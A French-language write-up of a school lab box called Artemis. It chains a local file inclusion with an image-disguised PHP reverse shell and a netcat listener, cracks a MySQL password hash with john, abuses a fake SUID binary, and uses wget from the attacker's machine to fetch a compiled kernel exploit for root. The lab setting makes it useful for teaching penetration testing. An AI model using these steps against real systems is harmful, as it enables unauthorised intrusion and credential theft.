<br/>

<p align="center">
 <h2 align="center">Artemis</h2>
</p>
</br>

<p align="left">
 <h3 align="left">Table of Contents</h4>
</p>
<hr size=1px>
<ol type=I>
      <li><a href="#box">Box</a></li>
      <li><a href="#profile">Profile</a></li>
      <li><a href="#enumeration">Information Gathering</a></li>
      <ol>
          <li><a href="#1.scan port">Scan Port</a></li>
          <li><a href="#2.ftp">FTP</a></li>
          <li><a href="#3.web">Web</a></li>
      </ol>
      <li><a href="#exploit">Exploit</a></li>
	  <li><a href="#privilege escalation">Privilege Escalation</a></li>
      <ol>
          <li><a href="#1.hidden">Hidden</a></li>
          <li><a href="#2.surprise">Surprise</a></li>
    </ol>


<p align="left">
 <h4 align="left">Box</h4>
</p>
<hr size=1px>
<a href="https://www.esgi.fr/" alt="Box">
<img src="Artemis.assets/esgi.jpg"></a>


<p align="left">
 <h4 align="left">Information Gathering</h4>
</p>
<hr size=1px>

Débutons par un traditionnel scan de port.

<p align= "left">
 <h6 align= "left"><U>1.Scan Port</U></h6>
</p>
> sudo nmap -sSV -sC  -p- 192.168.52.131

- `-sV : Détection de version sur les services utilisé.`
- `-sS :  SYN Scan, scan plutôt furtif.`
- `-sC : Exécute une série de scripts sur les services trouvé.`
- `-p- : Scan tous les ports existant.`

![image-20210325140435655](Artemis.assets/image-20210325140435655.png)

On peut voir que le port 80(http) est ouvert et que les ports 25452(ssh) ainsi que 61337(ftp) sont ouverts sur des ports différents.

Grâce aux scripts lancés par nmap, on peut constater que le partage ftp autorise la connexion au utilisateur anonyme, de plus le ftp contient des fichiers visibles sur le nmap.



<p align= "left">
 <h6 align= "left"><U>2.FTP</U></h6>
</p>
> ftp 192.168.52.131 61337

Name: Anonymous

Password: Anonymous

![image-20210325140634098](Artemis.assets/image-20210325140634098.png)

Plusieurs fichiers sont contenus dans le ftp.

Exportons tout ça.

![image-20210325140716461](Artemis.assets/image-20210325140716461.png)

Regardons le contenu de ses fichiers.

Letter.txt :

![image-20210325140918173](Artemis.assets/image-20210325140918173.png)

La seule information intéressante dans ce fichier, est qu'il nous dit que les autres fichiers contiennent des logs.



auth.log :

![image-20210325140940162](Artemis.assets/image-20210325140940162.png)

À première vue, il n'y a pas grand chose d'intéressant.



access.log :

![image-20210325140852048](Artemis.assets/image-20210325140852048.png)

Dans ce fichier, on peut voir que des requêtes sont faites vers le serveur web, filtrons les requêtes uniquement réussies afin de voir si des répertoires seraient dévoilés(réponse 200).



> cat access.log | grep 200

![image-20210325141021971](Artemis.assets/image-20210325141021971-1616945480042.png)

On voit une requête vers un dossier avec un nom assez atypique, allons voir ça de plus près.



<p align= "left">
 <h6 align= "left"><U>3.Web</U></h6>
</p>

![image-20210325141200875](Artemis.assets/image-20210325141200875-1616945578731.png)

Nous voilà sur une page secrète de l'ESGI, énumérons les sous dossiers.



> ffuf -w /usr/share/SecLists/Discovery/Web-Content/common.txt -u http://192.168.52.131/0cdb312366ecf1f493bc83f0fb56adda28125498762f28f1cc40c320300125ce/FUZZ

- `-w : Chemin vers la wordlist à utiliser.`
- `-u : Déclaration de la cible et du répertoire à énumérer.`

![image-20210325142635509](Artemis.assets/image-20210325142635509-1616945578731.png)

On découvre un dossier uploads accessible.

Regardons ça de plus près.



![image-20210325142908575](Artemis.assets/image-20210325142908575-1616945578731.png)

On trouve un répertoire qui liste tous les fichiers/dossiers présent à l'intérieur, si un dossier et nommé `uploads`, c'est qu'il doit exister un autre dossier où l'on peut upload des fichiers.

Allons tester les extensions php.



> ffuf -w /usr/share/SecLists/Discovery/Web-Content/common-PHP-Filename.txt -u http://192.168.52.131/0cdb312366ecf1f493bc83f0fb56adda28125498762f28f1cc40c320300125ce/FUZZ

![image-20210325143147270](Artemis.assets/image-20210325143147270-1616946298715.png)

2 nouveaux dossiers ont été découverts un upload.php (sûrement l'upload de fichier) et un language.php.



upload.php :

Comme pensé un système d'upload testons d'injecter un reverse shell en php.

![image-20210325143524222](Artemis.assets/image-20210325143524222-1616946298717.png)

L'upload nous bloque les extensions autres que les images(.jpeg, .png..), revenons dessus plus tard et allons voir l'autre dossier.



language.php :

![image-20210325143647788](Artemis.assets/image-20210325143647788-1616946510392.png)

En regardant l'URL on peut voir qu'il utilise des fichiers php, testons une attaque LFI.

![image-20210325143919115](Artemis.assets/image-20210325143919115-1616946510392.png)

Pas d'erreur, tentons encore plusieurs retours en arrière(../)

![image-20210325143953557](Artemis.assets/image-20210325143953557-1616946510392.png)

![image-20210325144007129](Artemis.assets/image-20210325144007129-1616946510393.png)

Bingo, on peut bien exécuter des fichiers dessus.

![image-20210325144023406](Artemis.assets/image-20210325144023406-1616946510392.png)

Étant donné que cette page exécute du code php, si on upload une image contenant du code php, il devrait l'exécuter.



<p align="left">
 <h4 align="left">Exploit</h4>
</p>
<hr size=1px>

Pour le revershell shell, j'utilise celui du github de pentestmonkey.


![Screenshot_20210328_182149](Artemis.assets/Screenshot_20210328_182149.png)

On attribue l'ip de la machine attaquante, ainsi que le port que l'on va ouvrir pour recevoir la connexion de la cible.

![Screenshot_20210328_185110](Artemis.assets/Screenshot_20210328_185110.png)

Maintenant, allons upload le reverse shell.

![image-20210325144500368](Artemis.assets/image-20210325144500368-1616950004532.png)

![image-20210325144513181](Artemis.assets/image-20210325144513181-1616950004535.png)

Parfait vérifions dans le dossier upload.

![image-20210325144552958](Artemis.assets/image-20210325144552958-1616950004536.png)



On va débuter une écoute sur le port défini, dans le reverse shell.

> nc -lnvp 4444

![image-20210325144655270](Artemis.assets/image-20210325144655270-1616947692590.png)

Retournons dans language.php pour exécuter le reverse shell.

![image-20210325144727610](Artemis.assets/image-20210325144727610-1616947692590.png)

Étant donné que les deux dossiers sont dans le même répertoire, il suffit de mettre le chemin /uploads/rev.php.jpg.

![image-20210325145241927](Artemis.assets/image-20210325145241927-1616947692591.png)

Nous voilà avec un shell sur l'utilisateur www-data.



<p align="left">
 <h4 align="left">Privilege Escalation</h4>
</p>
<hr size=1px>

Nous allons commencer par le chemin hidden.


www-data -> eguillemot -> khennou -> root



<p align= "left">
 <h6 align= "left"><U>1.Hidden</U></h6>
</p>

Étant donné qu'il existe des formulaire en php, cela nous permet de déduire qu'il y a une base de données vers qui le php envoi des requêtes(sûrement sql).

> find / -name *.sql -type f 2>/dev/null

![image-20210325145838691](Artemis.assets/image-20210325145838691-1616950988196.png)

Nous voilà avec le mdp hash de l'utilisateur eguillemot.

![image-20210325150515663](Artemis.assets/image-20210325150515663-1616950988198.png)

Avec hash-identifier on retrouve le hash utiliser,  dans notre cas, c'est le mysql-sha1.

![image-20210325150603801](Artemis.assets/image-20210325150603801-1616950988198.png)

Stockons le mdp chiffré dans un fichier temporaire.

> echo -n '*B38E48ED65DF090D475F5F25E030D183BC140ECD' > abc.txt
>

![image-20210325150705093](Artemis.assets/image-20210325150705093-1616951241511.png)

Vérifions si john possède ce type de hash.

> john --list=formats | grep mysql

![image-20210325150945541](Artemis.assets/image-20210325150945541-1616951241509.png)

￼John le connais, parfait, on peut donc tenter de trouver le mot de passe.

Étant donnée que je l'ai déjà fait, il me dit que john le possède déjà dans ses logs.

> john --format=mysql-sha1 abc.txt

![image-20210325150903799](Artemis.assets/image-20210325150903799-1616951349132.png)

Nous voilà avec le mot de passe de l'utilisateur guillemot qui est esgi.

![image-20210325151130554](Artemis.assets/image-20210325151130554-1616951349131.png)

Nous voilà connectés sur le user eguillemot

![image-20210325151317178](Artemis.assets/image-20210325151317178-1616951349132.png)

flag user.txt:

![image-20210325235345486](Artemis.assets/image-20210325235345486-1616951349132.png)

Tentons maintenant d'accéder à l'utilisateur khennou.

> find / -perm /4000 -user khennou 2>/dev/null

![image-20210325224352025](Artemis.assets/image-20210325224352025-1616951525131.png)

Grâce à la commande find et son option -perm 4000 on sait qu'il y a un SUID de l'utilisateur khennou sur la commande whois.

En exécutant whois, on aperçoit que rien ne s'affiche, or la commande par défaut affiche au moins une erreur, cela veut dire que ce n'est pas la vrais commande whois.

![image-20210325224437698](Artemis.assets/image-20210325224437698-1616951525131.png)

Exportant le binaire sur notre machine pour voir exactement ce qu'il fait.



Analyse static:

En utilisant l'outil cutter et son outil décompilé, on voit qu'elle exécute un shell bash avec l'id de l'utilisateur(khennou dans notre cas), on voit de plus qu'il fait une comparaison entre l'adresse var_24h et s2.

![image-20210325224601590](Artemis.assets/image-20210325224601590-1616951525131.png)

Analyse dinamique:

Sur gdb on voit qu'il compare les variables RSI ainsi que RDI, le code est affiché en clair dans la variable RSI (étant donné que rdi est notre input).

![image-20210325224716557](Artemis.assets/image-20210325224716557-1616951525131.png)

Nous voilà maintenant avec l'utilisateur khennou.

![image-20210325224528692](Artemis.assets/image-20210325224528692-1616951525131.png)

En regarde les droits sudo, on voit que cet utilisateur possède les droits root sans mot de passe.

![image-20210325225203274](Artemis.assets/image-20210325225203274-1616951525132.png)

flag root.txt:

![image-20210325235317154](Artemis.assets/image-20210325235317154-1616951525132.png)



Le chemin surprise consiste à passer de l'utilisateur eguillemot à root.

<p align= "left">
 <h6 align= "left"><U>2.Surprise</U></h6>
</p>

En récupérant la version du kernel et en faisant un searchsploit on voit qu'elle est vulnérable.

![image-20210326160337182](Artemis.assets/image-20210326160337182-1616951625382.png)

![image-20210326161141971](Artemis.assets/image-20210326161141971-1616951625383.png)

La CVE nous renvoie vers le script suivant :

www.halfdog.net/Misc/Utils/UserNamespaceExec.c

Compiler le code c:

> gcc UserNamespaceExec.c -o UserNamespaceExec

![image-20210326163713912](Artemis.assets/image-20210326163713912-1616951625383.png)

On ouvre un serveur web afin de récupérer le script sur la machine distante.

> wget 192.168.52.128:8000/UserNamespaceExec

![image-20210326164835851](Artemis.assets/image-20210326164835851-1616951625383.png)

> chmod +x UserNamespace

Rendre le script exécutable.

![image-20210326165659822](Artemis.assets/image-20210326165659822-1616951625383.png)

> ./UserNamespaceExec -- /bin/bash

![image-20210326165929574](Artemis.assets/image-20210326165929574-1616951625383.png)



Cela conclut donc la box <u>Artemis</u> donné par notre formateur <u>Thibaud Robin</u> de <u>l'ESGI</u>.

<u>Ethost.</u>